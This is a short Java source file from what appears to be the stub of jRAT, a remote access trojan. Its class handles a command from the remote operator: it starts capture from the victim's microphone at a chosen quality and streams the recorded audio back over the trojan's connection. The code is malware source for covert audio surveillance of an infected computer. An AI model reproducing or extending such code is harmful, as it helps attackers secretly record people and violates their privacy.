package pro.jrat.stub.packets.incoming;

import pro.jrat.stub.Connection;
import pro.jrat.stub.Sound;
import pro.jrat.stub.packets.outgoing.Packet58Microphone;

public class Packet84SoundCapture extends AbstractIncomingPacket {

	@Override
	public void read() throws Exception {
		if (Connection.readBoolean()) {
			int quality = Connection.readInt();
			Connection.addToSendQueue(new Packet58Microphone());
			Sound.initialize(quality);
			Sound.write(Connection.dos);
			
			Connection.lock();
		} else {
			Connection.addToSendQueue(new Packet58Microphone());
			Sound.write(Connection.dos);
			
			Connection.lock();
		}
	}

}
